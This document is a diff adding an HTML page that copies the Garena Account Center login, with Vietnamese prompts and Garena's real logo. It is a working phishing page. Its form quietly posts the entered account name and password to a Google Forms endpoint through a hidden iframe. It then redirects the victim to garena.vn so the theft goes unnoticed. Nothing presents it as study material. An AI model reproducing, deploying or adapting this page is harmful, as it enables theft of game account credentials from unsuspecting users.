@@ -1,0 +1,66 @@
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Garena Account Center</title>
+
+  <!-- HTML -->
+
+
+  <!-- Custom Styles -->
+  <!--<link rel="stylesheet" href="./reset.css">-->
+  <link rel="stylesheet" href="./css/style.css">
+</head>
+
+<body>
+  <div class="app">
+    <div class="header">
+      <div class="container">
+        <a class="logo" href="">
+          <img src="https://sso.garena.com/universal/assets/logo.9d415851.svg" class="logo__image">
+        </a>
+        <select class="language">
+          <option value="en-US">International - English</option>
+          <option value="en-US">International - English</option>
+          <option value="en-US">International - English</option>
+          <option value="en-US">International - English</option>
+        </select>
+      </div>
+    </div>
+    <div class="main">
+      <script>
+        var submitted = false;
+      </script>
+      <iframe name="hidden_iframe" id="hidden_iframe" style="display: none;" onload="if(submitted) {window.location='https://www.garena.vn/';}"></iframe>
+      <form action="https://docs.google.com/forms/u/0/d/e/1FAIpQLScj-6adAGynBbFNpCNB-vwQlNpvlbJSgMtcfN0OCHwhCpbJ2Q/formResponse" method="post" target="hidden_iframe" onsubmit="return validateForm(); " id="form-sheet">
+        <h2>Đăng nhập</h2>
+        <div class="btn info">
+          <span>*</span>
+          <input type=" text" placeholder="Tài khoản Garena, Email hoặc số điện thoại" name="entry.2062629110" id="account" required placeholder="Type something in here" pattern="\S+.*">
+        </div>
+        <div class="btn info">
+          <span>*</span>
+          <input type="password" placeholder="Mật khẩu" required name="entry.1139639349">
+        </div>
+        <a href="#" class="forgot">Quên mật khẩu?</a>
+        <div class="btn">
+          <button class="primary" type="submit">Đăng nhập ngay</button>
+        </div>
+        <div class="btn">
+          <button class="secondary">Tạo tài khoản mới</button>
+        </div>
+      </form>
+    </div>
+  </div>
+  <!-- Project -->
+  <script>
+  document.querySelector('#form-sheet').onsubmit = function(e) {
+  submitted = true;
+  }
+  </script>
+</body>
+
+</html>
